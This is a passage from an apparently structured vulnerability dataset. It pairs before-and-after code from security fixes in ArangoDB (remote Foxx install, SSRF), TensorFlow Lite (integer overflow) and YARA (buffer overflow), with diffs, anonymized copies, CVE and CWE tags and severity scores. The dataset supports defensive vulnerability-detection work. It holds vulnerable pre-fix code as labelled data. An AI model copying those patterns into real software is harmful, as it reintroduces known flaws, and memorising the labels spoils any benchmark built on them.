                     arangodb::options::makeFlags(
                     arangodb::options::Flags::DefaultNoComponents,
                     arangodb::options::Flags::OnCoordinator,
                     arangodb::options::Flags::OnSingle))
                     .setIntroducedIn(30805);
}",arangodb/d9b7f019d2435f107b19a59190bf9cc27d5f34dd/ServerSecurityFeature.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -12,6 +12,7 @@
                      arangodb::options::Flags::OnCoordinator,
                      arangodb::options::Flags::OnSingle))
                      .setIntroducedIn(30500);
+
   options->addOption(""--foxx.store"", ""enables Foxx store in web interface"",
                      new BooleanParameter(&_enableFoxxStore),
                      arangodb::options::makeFlags(
@@ -19,5 +20,12 @@
                      arangodb::options::Flags::OnCoordinator,
                      arangodb::options::Flags::OnSingle))
                      .setIntroducedIn(30500);
-
+  
+  options->addOption(""--foxx.allow-install-from-remote"", ""allow installing Foxx apps from remote URLs other than Github"",
+                     new BooleanParameter(&_foxxAllowInstallFromRemote),
+                     arangodb::options::makeFlags(
+                     arangodb::options::Flags::DefaultNoComponents,
+                     arangodb::options::Flags::OnCoordinator,
+                     arangodb::options::Flags::OnSingle))
+                     .setIntroducedIn(30805);
 }","{'deleted_lines': [''], 'added_lines': ['', '  ', '  options->addOption(""--foxx.allow-install-from-remote"", ""allow installing Foxx apps from remote URLs other than Github"",', '                     new BooleanParameter(&_foxxAllowInstallFromRemote),', '                     arangodb::options::makeFlags(', '                     arangodb::options::Flags::DefaultNoComponents,', '                     arangodb::options::Flags::OnCoordinator,', '                     arangodb::options::Flags::OnSingle))', '                     .setIntroducedIn(30805);']}",True,"In ArangoDB, versions v3.7.0 through v3.9.0-alpha.1 have a feature which allows downloading a Foxx service from a publicly available URL. This feature does not enforce proper filtering of requests performed internally, which can be abused by a highly-privileged attacker to perform blind SSRF and send internal requests to localhost.",2.7,LOW,0,valid,2021-12-14T10:24:01Z,4
CVE-2021-25939,['CWE-918'],AV:N/AC:L/Au:S/C:N/I:P/A:N,0,arangodb,[APM-78] Disable installation from remote URL (#15292),d9b7f019d2435f107b19a59190bf9cc27d5f34dd,https://github.com/arangodb/arangodb/commit/d9b7f019d2435f107b19a59190bf9cc27d5f34dd,arangod/GeneralServer/ServerSecurityFeature.cpp,ServerSecurityFeature::ServerSecurityFeature,"ServerSecurityFeature::ServerSecurityFeature(application_features::ApplicationServer& server)
: ApplicationFeature(server, ""ServerSecurity""),
_enableFoxxApi(true),
_enableFoxxStore(true),
_hardenedRestApi(false) {
setOptional(false);
startsAfter<application_features::GreetingsFeaturePhase>();
}","ServerSecurityFeature::ServerSecurityFeature(application_features::ApplicationServer& VAR_0)
: ApplicationFeature(VAR_0, ""ServerSecurity""),
_enableFoxxApi(true),
_enableFoxxStore(true),
_hardenedRestApi(false) {
setOptional(false);
VAR_1<application_features::GreetingsFeaturePhase>();
}",arangodb/d9b7f019d2435f107b19a59190bf9cc27d5f34dd/ServerSecurityFeature.cpp/vul/before/1.json,"ServerSecurityFeature::ServerSecurityFeature(application_features::ApplicationServer& server)
    : ApplicationFeature(server, ""ServerSecurity""),
      _enableFoxxApi(true),
      _enableFoxxStore(true),
      _hardenedRestApi(false),
      _foxxAllowInstallFromRemote(false) {
  setOptional(false);
  startsAfter<application_features::GreetingsFeaturePhase>();
}","ServerSecurityFeature::ServerSecurityFeature(application_features::ApplicationServer& VAR_0)
    : ApplicationFeature(VAR_0, ""ServerSecurity""),
      _enableFoxxApi(true),
      _enableFoxxStore(true),
      _hardenedRestApi(false),
      _foxxAllowInstallFromRemote(false) {
  setOptional(false);
  VAR_1<application_features::GreetingsFeaturePhase>();
}",arangodb/d9b7f019d2435f107b19a59190bf9cc27d5f34dd/ServerSecurityFeature.cpp/vul/after/1.json,"--- func_before
+++ func_after
@@ -2,7 +2,8 @@
     : ApplicationFeature(server, ""ServerSecurity""),
       _enableFoxxApi(true),
       _enableFoxxStore(true),
-      _hardenedRestApi(false) {
+      _hardenedRestApi(false),
+      _foxxAllowInstallFromRemote(false) {
   setOptional(false);
   startsAfter<application_features::GreetingsFeaturePhase>();
 }","{'deleted_lines': ['      _hardenedRestApi(false) {'], 'added_lines': ['      _hardenedRestApi(false),', '      _foxxAllowInstallFromRemote(false) {']}",True,"In ArangoDB, versions v3.7.0 through v3.9.0-alpha.1 have a feature which allows downloading a Foxx service from a publicly available URL. This feature does not enforce proper filtering of requests performed internally, which can be abused by a highly-privileged attacker to perform blind SSRF and send internal requests to localhost.",2.7,LOW,0,valid,2021-12-14T10:24:01Z,4
CVE-2021-25939,['CWE-918'],AV:N/AC:L/Au:S/C:N/I:P/A:N,0,arangodb,[APM-78] Disable installation from remote URL (#15292),d9b7f019d2435f107b19a59190bf9cc27d5f34dd,https://github.com/arangodb/arangodb/commit/d9b7f019d2435f107b19a59190bf9cc27d5f34dd,arangod/V8Server/v8-actions.cpp,TRI_InitV8ServerUtils,"void TRI_InitV8ServerUtils(v8::Isolate* isolate) {
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate, ""SYS_CLUSTER_API_JWT_POLICY""), JS_ClusterApiJwtPolicy, true);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_API_DISABLED""), JS_IsFoxxApiDisabled, true);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_STORE_DISABLED""), JS_IsFoxxStoreDisabled, true);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate, ""SYS_RUN_IN_RESTRICTED_CONTEXT""), JS_RunInRestrictedContext, true);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate,
""SYS_CREATE_HOTBACKUP""),
JS_CreateHotbackup);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate,
""SYS_DEBUG_CLEAR_FAILAT""),
JS_DebugClearFailAt);
#ifdef ARANGODB_ENABLE_FAILURE_TESTS
TRI_AddGlobalFunctionVocbase(
isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_TERMINATE""), JS_DebugTerminate);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate,
""SYS_DEBUG_SET_FAILAT""),
JS_DebugSetFailAt);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate,
""SYS_DEBUG_REMOVE_FAILAT""),
JS_DebugRemoveFailAt);
TRI_AddGlobalFunctionVocbase(isolate,
TRI_V8_ASCII_STRING(isolate,
""SYS_DEBUG_SHOULD_FAILAT""),
JS_DebugShouldFailAt);
#endif
TRI_GET_GLOBALS();
FoxxFeature& foxxFeature = v8g->_server.getFeature<FoxxFeature>();
isolate->GetCurrentContext()
->Global()
->DefineOwnProperty(
TRI_IGETC, TRI_V8_ASCII_STRING(isolate, ""FOXX_QUEUES_POLL_INTERVAL""),
v8::Number::New(isolate, foxxFeature.pollInterval()), v8::ReadOnly)
.FromMaybe(false);  
isolate->GetCurrentContext()
->Global()
->DefineOwnProperty(
TRI_IGETC,
TRI_V8_ASCII_STRING(isolate, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
v8::Boolean::New(isolate, foxxFeature.startupWaitForSelfHeal()), v8::ReadOnly)
.FromMaybe(false);  }","void TRI_InitV8ServerUtils(v8::Isolate* VAR_0) {
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0, ""SYS_CLUSTER_API_JWT_POLICY""), VAR_1, true);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_API_DISABLED""), VAR_2, true);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_STORE_DISABLED""), VAR_3, true);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0, ""SYS_RUN_IN_RESTRICTED_CONTEXT""), VAR_4, true);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0,
""SYS_CREATE_HOTBACKUP""),
VAR_5);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0,
""SYS_DEBUG_CLEAR_FAILAT""),
VAR_6);
#ifdef VAR_7
TRI_AddGlobalFunctionVocbase(
VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_TERMINATE""), VAR_8);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0,
""SYS_DEBUG_SET_FAILAT""),
VAR_9);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0,
""SYS_DEBUG_REMOVE_FAILAT""),
VAR_10);
TRI_AddGlobalFunctionVocbase(VAR_0,
TRI_V8_ASCII_STRING(VAR_0,
""SYS_DEBUG_SHOULD_FAILAT""),
VAR_11);
#endif
TRI_GET_GLOBALS();
FoxxFeature& VAR_12 = VAR_13->_server.getFeature<FoxxFeature>();
VAR_0->GetCurrentContext()
->Global()
->DefineOwnProperty(
VAR_14, TRI_V8_ASCII_STRING(VAR_0, ""FOXX_QUEUES_POLL_INTERVAL""),
v8::Number::New(VAR_0, VAR_12.pollInterval()), v8::ReadOnly)
.FromMaybe(false);  
VAR_0->GetCurrentContext()
->Global()
->DefineOwnProperty(
VAR_14,
TRI_V8_ASCII_STRING(VAR_0, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
v8::Boolean::New(VAR_0, VAR_12.startupWaitForSelfHeal()), v8::ReadOnly)
.FromMaybe(false);  
}",arangodb/d9b7f019d2435f107b19a59190bf9cc27d5f34dd/v8-actions.cpp/vul/before/0.json,"void TRI_InitV8ServerUtils(v8::Isolate* isolate) {
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate, ""SYS_CLUSTER_API_JWT_POLICY""), JS_ClusterApiJwtPolicy, true);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_API_DISABLED""), JS_IsFoxxApiDisabled, true);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_STORE_DISABLED""), JS_IsFoxxStoreDisabled, true);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""), JS_FoxxAllowInstallFromRemote, true);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate, ""SYS_RUN_IN_RESTRICTED_CONTEXT""), JS_RunInRestrictedContext, true);
  
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate,
                                                   ""SYS_CREATE_HOTBACKUP""),
                               JS_CreateHotbackup);

  // debugging functions
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate,
                                                   ""SYS_DEBUG_CLEAR_FAILAT""),
                               JS_DebugClearFailAt);

#ifdef ARANGODB_ENABLE_FAILURE_TESTS
  TRI_AddGlobalFunctionVocbase(
      isolate, TRI_V8_ASCII_STRING(isolate, ""SYS_DEBUG_TERMINATE""), JS_DebugTerminate);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate,
                                                   ""SYS_DEBUG_SET_FAILAT""),
                               JS_DebugSetFailAt);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate,
                                                   ""SYS_DEBUG_REMOVE_FAILAT""),
                               JS_DebugRemoveFailAt);
  TRI_AddGlobalFunctionVocbase(isolate,
                               TRI_V8_ASCII_STRING(isolate,
                                                   ""SYS_DEBUG_SHOULD_FAILAT""),
                               JS_DebugShouldFailAt);
#endif

  // poll interval for Foxx queues
  TRI_GET_GLOBALS();
  FoxxFeature& foxxFeature = v8g->_server.getFeature<FoxxFeature>();

  isolate->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          TRI_IGETC, TRI_V8_ASCII_STRING(isolate, ""FOXX_QUEUES_POLL_INTERVAL""),
          v8::Number::New(isolate, foxxFeature.pollInterval()), v8::ReadOnly)
      .FromMaybe(false);  // ignore result

  isolate->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          TRI_IGETC,
          TRI_V8_ASCII_STRING(isolate, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
          v8::Boolean::New(isolate, foxxFeature.startupWaitForSelfHeal()), v8::ReadOnly)
      .FromMaybe(false);  // ignore result
}","void TRI_InitV8ServerUtils(v8::Isolate* VAR_0) {
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0, ""SYS_CLUSTER_API_JWT_POLICY""), VAR_1, true);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_API_DISABLED""), VAR_2, true);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0, ""SYS_IS_FOXX_STORE_DISABLED""), VAR_3, true);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""), VAR_4, true);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0, ""SYS_RUN_IN_RESTRICTED_CONTEXT""), VAR_5, true);
  
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0,
                                                   ""SYS_CREATE_HOTBACKUP""),
                               VAR_6);

  /* COMMENT_0 */
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0,
                                                   ""SYS_DEBUG_CLEAR_FAILAT""),
                               VAR_7);

#ifdef VAR_8
  TRI_AddGlobalFunctionVocbase(
      VAR_0, TRI_V8_ASCII_STRING(VAR_0, ""SYS_DEBUG_TERMINATE""), VAR_9);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0,
                                                   ""SYS_DEBUG_SET_FAILAT""),
                               VAR_10);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0,
                                                   ""SYS_DEBUG_REMOVE_FAILAT""),
                               VAR_11);
  TRI_AddGlobalFunctionVocbase(VAR_0,
                               TRI_V8_ASCII_STRING(VAR_0,
                                                   ""SYS_DEBUG_SHOULD_FAILAT""),
                               VAR_12);
#endif

  /* COMMENT_1 */
  TRI_GET_GLOBALS();
  FoxxFeature& VAR_13 = VAR_14->_server.getFeature<FoxxFeature>();

  VAR_0->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          VAR_15, TRI_V8_ASCII_STRING(VAR_0, ""FOXX_QUEUES_POLL_INTERVAL""),
          v8::Number::New(VAR_0, VAR_13.pollInterval()), v8::ReadOnly)
      .FromMaybe(false);  /* COMMENT_2 */

  VAR_0->GetCurrentContext()
      ->Global()
      ->DefineOwnProperty(
          VAR_15,
          TRI_V8_ASCII_STRING(VAR_0, ""FOXX_STARTUP_WAIT_FOR_SELF_HEAL""),
          v8::Boolean::New(VAR_0, VAR_13.startupWaitForSelfHeal()), v8::ReadOnly)
      .FromMaybe(false);  /* COMMENT_2 */
}",arangodb/d9b7f019d2435f107b19a59190bf9cc27d5f34dd/v8-actions.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -5,6 +5,8 @@
                                TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_API_DISABLED""), JS_IsFoxxApiDisabled, true);
   TRI_AddGlobalFunctionVocbase(isolate,
                                TRI_V8_ASCII_STRING(isolate, ""SYS_IS_FOXX_STORE_DISABLED""), JS_IsFoxxStoreDisabled, true);
+  TRI_AddGlobalFunctionVocbase(isolate,
+                               TRI_V8_ASCII_STRING(isolate, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""), JS_FoxxAllowInstallFromRemote, true);
   TRI_AddGlobalFunctionVocbase(isolate,
                                TRI_V8_ASCII_STRING(isolate, ""SYS_RUN_IN_RESTRICTED_CONTEXT""), JS_RunInRestrictedContext, true);
   ","{'deleted_lines': [], 'added_lines': ['  TRI_AddGlobalFunctionVocbase(isolate,', '                               TRI_V8_ASCII_STRING(isolate, ""SYS_FOXX_ALLOW_INSTALL_FROM_REMOTE""), JS_FoxxAllowInstallFromRemote, true);']}",True,"In ArangoDB, versions v3.7.0 through v3.9.0-alpha.1 have a feature which allows downloading a Foxx service from a publicly available URL. This feature does not enforce proper filtering of requests performed internally, which can be abused by a highly-privileged attacker to perform blind SSRF and send internal requests to localhost.",2.7,LOW,0,valid,2021-12-14T10:24:01Z,4
CVE-2022-23558,['CWE-190'],AV:N/AC:L/Au:S/C:P/I:P/A:P,0,tensorflow,"[lite] Update TfLiteIntArrayCreate to return size_t

PiperOrigin-RevId: 416439896
Change-Id: I847f69b68d1ddaff4b1e925a09b8b69c1756653b",a1e1511dde36b3f8aa27a6ec630838e7ea40e091,https://github.com/tensorflow/tensorflow/commit/a1e1511dde36b3f8aa27a6ec630838e7ea40e091,tensorflow/lite/c/common.c,TfLiteIntArrayCreate,"TfLiteIntArray* TfLiteIntArrayCreate(int size) {
int alloc_size = TfLiteIntArrayGetSizeInBytes(size);
if (alloc_size <= 0) return NULL;
TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);
if (!ret) return ret;
ret->size = size;
return ret;
}","TfLiteIntArray* TfLiteIntArrayCreate(int VAR_0) {
int VAR_1 = TfLiteIntArrayGetSizeInBytes(VAR_0);
if (VAR_1 <= 0) return NULL;
TfLiteIntArray* VAR_2 = (TfLiteIntArray*)malloc(VAR_1);
if (!VAR_2) return VAR_2;
VAR_2->size = VAR_0;
return VAR_2;
}",tensorflow/a1e1511dde36b3f8aa27a6ec630838e7ea40e091/common.c/vul/before/0.json,"TfLiteIntArray* TfLiteIntArrayCreate(int size) {
  size_t alloc_size = TfLiteIntArrayGetSizeInBytes(size);
  if (alloc_size <= 0) return NULL;
  TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);
  if (!ret) return ret;
  ret->size = size;
  return ret;
}","TfLiteIntArray* TfLiteIntArrayCreate(int VAR_0) {
  size_t VAR_1 = TfLiteIntArrayGetSizeInBytes(VAR_0);
  if (VAR_1 <= 0) return NULL;
  TfLiteIntArray* VAR_2 = (TfLiteIntArray*)malloc(VAR_1);
  if (!VAR_2) return VAR_2;
  VAR_2->size = VAR_0;
  return VAR_2;
}",tensorflow/a1e1511dde36b3f8aa27a6ec630838e7ea40e091/common.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,5 +1,5 @@
 TfLiteIntArray* TfLiteIntArrayCreate(int size) {
-  int alloc_size = TfLiteIntArrayGetSizeInBytes(size);
+  size_t alloc_size = TfLiteIntArrayGetSizeInBytes(size);
   if (alloc_size <= 0) return NULL;
   TfLiteIntArray* ret = (TfLiteIntArray*)malloc(alloc_size);
   if (!ret) return ret;","{'deleted_lines': ['  int alloc_size = TfLiteIntArrayGetSizeInBytes(size);'], 'added_lines': ['  size_t alloc_size = TfLiteIntArrayGetSizeInBytes(size);']}",True,"Tensorflow is an Open Source Machine Learning Framework. An attacker can craft a TFLite model that would cause an integer overflow in `TfLiteIntArrayCreate`. The `TfLiteIntArrayGetSizeInBytes` returns an `int` instead of a `size_t. An attacker can control model inputs such that `computed_size` overflows the size of `int` datatype. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",7.6,HIGH,2,valid,2021-12-15T02:09:55Z,4
CVE-2022-23558,['CWE-190'],AV:N/AC:L/Au:S/C:P/I:P/A:P,0,tensorflow,"[lite] Update TfLiteIntArrayCreate to return size_t

PiperOrigin-RevId: 416439896
Change-Id: I847f69b68d1ddaff4b1e925a09b8b69c1756653b",a1e1511dde36b3f8aa27a6ec630838e7ea40e091,https://github.com/tensorflow/tensorflow/commit/a1e1511dde36b3f8aa27a6ec630838e7ea40e091,tensorflow/lite/c/common.c,TfLiteIntArrayGetSizeInBytes,"int TfLiteIntArrayGetSizeInBytes(int size) {
static TfLiteIntArray dummy;
int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;
#if defined(_MSC_VER)
computed_size -= sizeof(dummy.data[0]);
#endif
return computed_size;
}","int TfLiteIntArrayGetSizeInBytes(int VAR_0) {
static TfLiteIntArray VAR_1;
int VAR_2 = sizeof(VAR_1) + sizeof(VAR_1.data[0]) * VAR_0;
#if defined(VAR_3)
VAR_2 -= sizeof(VAR_1.data[0]);
#endif
return VAR_2;
}",tensorflow/a1e1511dde36b3f8aa27a6ec630838e7ea40e091/common.c/vul/before/1.json,"size_t TfLiteIntArrayGetSizeInBytes(int size) {
  static TfLiteIntArray dummy;

  size_t computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;
#if defined(_MSC_VER)
  // Context for why this is needed is in http://b/189926408#comment21
  computed_size -= sizeof(dummy.data[0]);
#endif
  return computed_size;
}","size_t TfLiteIntArrayGetSizeInBytes(int VAR_0) {
  static TfLiteIntArray VAR_1;

  size_t VAR_2 = sizeof(VAR_1) + sizeof(VAR_1.data[0]) * VAR_0;
#if defined(VAR_3)
  /* COMMENT_0 */
  VAR_2 -= sizeof(VAR_1.data[0]);
#endif
  return VAR_2;
}",tensorflow/a1e1511dde36b3f8aa27a6ec630838e7ea40e091/common.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,7 +1,7 @@
-int TfLiteIntArrayGetSizeInBytes(int size) {
+size_t TfLiteIntArrayGetSizeInBytes(int size) {
   static TfLiteIntArray dummy;
 
-  int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;
+  size_t computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;
 #if defined(_MSC_VER)
   // Context for why this is needed is in http://b/189926408#comment21
   computed_size -= sizeof(dummy.data[0]);","{'deleted_lines': ['int TfLiteIntArrayGetSizeInBytes(int size) {', '  int computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;'], 'added_lines': ['size_t TfLiteIntArrayGetSizeInBytes(int size) {', '  size_t computed_size = sizeof(dummy) + sizeof(dummy.data[0]) * size;']}",True,"Tensorflow is an Open Source Machine Learning Framework. An attacker can craft a TFLite model that would cause an integer overflow in `TfLiteIntArrayCreate`. The `TfLiteIntArrayGetSizeInBytes` returns an `int` instead of a `size_t. An attacker can control model inputs such that `computed_size` overflows the size of `int` datatype. The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.",7.6,HIGH,2,valid,2021-12-15T02:09:55Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/libyara.c,yr_get_configuration,"YR_API int yr_get_configuration(YR_CONFIG_NAME name, void *dest)
{
if (dest == NULL)
return ERROR_INTERNAL_FATAL_ERROR;
switch (name)
{    case YR_CONFIG_STACK_SIZE:
case YR_CONFIG_MAX_STRINGS_PER_RULE:
case YR_CONFIG_MAX_MATCH_DATA:
*(uint32_t *) dest = yr_cfgs[name].ui32;
break;
case YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK:
*(uint64_t *) dest = yr_cfgs[name].ui64;
break;
default:
return ERROR_INTERNAL_FATAL_ERROR;
}
return ERROR_SUCCESS;
}","YR_API VAR_0 yr_get_configuration(YR_CONFIG_NAME VAR_1, void *VAR_2)
{
if (VAR_2 == NULL)
return VAR_3;
switch (VAR_1)
{  
case VAR_4:
case VAR_5:
case VAR_6:
*(uint32_t *) VAR_2 = VAR_7[VAR_1].ui32;
break;
case VAR_8:
*(uint64_t *) VAR_2 = VAR_7[VAR_1].ui64;
break;
default:
return VAR_3;
}
return VAR_9;
}",,"YR_API int yr_get_configuration(YR_CONFIG_NAME name, void *dest)
{
  if (dest == NULL)
    return ERROR_INVALID_ARGUMENT;

  switch (name)
  {  // lump all the cases using same types together in one cascade
  case YR_CONFIG_STACK_SIZE:
  case YR_CONFIG_MAX_STRINGS_PER_RULE:
  case YR_CONFIG_MAX_MATCH_DATA:
    *(uint32_t *) dest = yr_cfgs[name].ui32;
    break;

  case YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK:
    *(uint64_t *) dest = yr_cfgs[name].ui64;
    break;

  default:
    return ERROR_INVALID_ARGUMENT;
  }

  return ERROR_SUCCESS;
}","YR_API VAR_0 yr_get_configuration(YR_CONFIG_NAME VAR_1, void *VAR_2)
{
  if (VAR_2 == NULL)
    return VAR_3;

  switch (VAR_1)
  {  /* COMMENT_0 */
  case VAR_4:
  case VAR_5:
  case VAR_6:
    *(uint32_t *) VAR_2 = VAR_7[VAR_1].ui32;
    break;

  case VAR_8:
    *(uint64_t *) VAR_2 = VAR_7[VAR_1].ui64;
    break;

  default:
    return VAR_3;
  }

  return VAR_9;
}",,"--- func_before
+++ func_after
@@ -1,7 +1,7 @@
 YR_API int yr_get_configuration(YR_CONFIG_NAME name, void *dest)
 {
   if (dest == NULL)
-    return ERROR_INTERNAL_FATAL_ERROR;
+    return ERROR_INVALID_ARGUMENT;
 
   switch (name)
   {  // lump all the cases using same types together in one cascade
@@ -16,7 +16,7 @@
     break;
 
   default:
-    return ERROR_INTERNAL_FATAL_ERROR;
+    return ERROR_INVALID_ARGUMENT;
   }
 
   return ERROR_SUCCESS;","{'deleted_lines': ['    return ERROR_INTERNAL_FATAL_ERROR;', '    return ERROR_INTERNAL_FATAL_ERROR;'], 'added_lines': ['    return ERROR_INVALID_ARGUMENT;', '    return ERROR_INVALID_ARGUMENT;']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/scanner.c,yr_scanner_scan_mem_blocks,"YR_API int yr_scanner_scan_mem_blocks(
YR_SCANNER* scanner,
YR_MEMORY_BLOCK_ITERATOR* iterator)
{
YR_DEBUG_FPRINTF(2, stderr, ""+ %s() {\n"", __FUNCTION__);
YR_RULES* rules;
YR_RULE* rule;
YR_MEMORY_BLOCK* block;
int i, result = ERROR_SUCCESS;
if (scanner->callback == NULL)
{
result = ERROR_CALLBACK_REQUIRED;
goto _exit;
}
scanner->iterator = iterator;
rules = scanner->rules;
if (iterator->last_error == ERROR_BLOCK_NOT_READY)
{
block = iterator->next(iterator);
}
else
{
uint32_t max_match_data;
FAIL_ON_ERROR(
yr_get_configuration(YR_CONFIG_MAX_MATCH_DATA, &max_match_data));
result = yr_notebook_create(
1024 * (sizeof(YR_MATCH) + max_match_data), &scanner->matches_notebook);
if (result != ERROR_SUCCESS)
goto _exit;
yr_stopwatch_start(&scanner->stopwatch);
block = iterator->first(iterator);
}
while (block != NULL)
{
const uint8_t* data = block->fetch_data(block);
if (data == NULL)
{
block = iterator->next(iterator);
continue;
}
if (scanner->entry_point == YR_UNDEFINED)
{
YR_TRYCATCH(
!(scanner->flags & SCAN_FLAGS_NO_TRYCATCH),
{
if (scanner->flags & SCAN_FLAGS_PROCESS_MEMORY)
scanner->entry_point = yr_get_entry_point_address(
data, block->size, block->base);
else
scanner->entry_point = yr_get_entry_point_offset(
data, block->size);
},
{});
}
YR_TRYCATCH(
!(scanner->flags & SCAN_FLAGS_NO_TRYCATCH),
{ result = _yr_scanner_scan_mem_block(scanner, data, block); }","YR_API VAR_0 yr_scanner_scan_mem_blocks(
YR_SCANNER* VAR_1,
YR_MEMORY_BLOCK_ITERATOR* VAR_2)
{
YR_DEBUG_FPRINTF(2, VAR_3, ""+ %s() {\n"", VAR_4);
YR_RULES* VAR_5;
YR_RULE* VAR_6;
YR_MEMORY_BLOCK* VAR_7;
int VAR_8, VAR_9 = VAR_10;
if (VAR_1->callback == NULL)
{
VAR_9 = VAR_11;
goto _exit;
}
VAR_1->iterator = VAR_2;
VAR_5 = VAR_1->rules;
if (VAR_2->last_error == VAR_12)
{
VAR_7 = VAR_2->next(VAR_2);
}
else
{
uint32_t VAR_13;
FAIL_ON_ERROR(
yr_get_configuration(VAR_14, &VAR_13));
VAR_9 = yr_notebook_create(
1024 * (sizeof(VAR_15) + VAR_13), &VAR_1->matches_notebook);
if (VAR_9 != VAR_10)
goto _exit;
yr_stopwatch_start(&VAR_1->stopwatch);
VAR_7 = VAR_2->first(VAR_2);
}
while (VAR_7 != NULL)
{
const uint8_t* VAR_16 = VAR_7->fetch_data(VAR_7);
if (VAR_16 == NULL)
{
VAR_7 = VAR_2->next(VAR_2);
continue;
